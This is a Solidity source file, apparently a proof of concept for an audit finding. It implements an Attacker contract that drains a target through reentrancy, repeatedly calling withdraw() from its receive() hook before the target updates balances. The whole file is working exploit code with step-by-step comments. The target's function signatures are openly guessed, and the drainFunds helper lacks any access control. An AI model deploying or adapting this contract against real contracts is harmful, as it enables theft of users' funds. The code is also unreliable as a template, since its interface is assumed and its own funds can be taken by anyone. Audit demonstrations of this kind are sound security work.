// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @dev This interface represents the vulnerable contract found in
 * HELL-Audit-by-BlockSAFU__finding_7.sol. The function signatures are assumed
 * based on a common reentrancy pattern where a withdrawal function is exploited.
 * A `deposit` function is included to allow the attacker to establish a balance.
 */
interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title Attacker
 * @dev This contract demonstrates a proof-of-concept for a reentrancy attack
 * on the vulnerable contract. The attack proceeds as follows:
 * 1. The attacker deposits some ETH into the vulnerable contract to gain a balance.
 * 2. The attacker calls the `attack()` function, which in turn calls the `withdraw()` function on the vulnerable contract.
 * 3. The vulnerable contract's `withdraw` function transfers ETH to this attacker contract via a low-level call.
 * 4. This triggers the attacker's `receive()` function before the vulnerable contract can update the attacker's balance.
 * 5. Inside the `receive()` function, the attacker re-enters the `withdraw()` function, draining more funds than entitled.
 */
contract Attacker {

    IVulnerable public target;
    uint256 public attackDeposit = 1 ether;
    uint public reentrancyCount = 0;

    /**
     * @dev Sets the address of the vulnerable target contract.
     */
    constructor(address _target) {
        target = IVulnerable(_target);
    }

    /**
     * @dev The `receive` function is the hook for the reentrancy attack.
     * It is triggered when the vulnerable contract sends ETH. It recursively
     * calls the `withdraw` function on the target to drain the contract's funds.
     */
    receive() external payable {
        // Limit re-entrancy to prevent running out of gas.
        if (reentrancyCount < 10) {
            reentrancyCount++;
            // Re-enter the vulnerable withdraw function while the target's balance is not yet updated
            if (address(target).balance > 0) {
                target.withdraw();
            }
        }
    }

    /**
     * @dev Initiates the attack.
     * Step 1: Deposit ETH into the vulnerable contract to establish a balance.
     * Step 2: Call the vulnerable `withdraw` function to begin the reentrancy loop.
     */
    function attack() external payable {
        require(msg.value >= attackDeposit, "Must send enough ETH to deposit");
        
        // Step 1: Deposit funds into the target contract to have a balance to withdraw
        target.deposit{value: attackDeposit}();
        
        // Step 2: Trigger the reentrancy by calling the vulnerable withdraw function
        target.withdraw();
    }

    /**
     * @dev A helper function to withdraw all funds from this attacker contract
     * to the owner after the attack is complete.
     */
    function drainFunds(address payable _to) external {
        (bool success, ) = _to.call{value: address(this).balance}("");
        require(success, "Failed to drain funds");
    }
}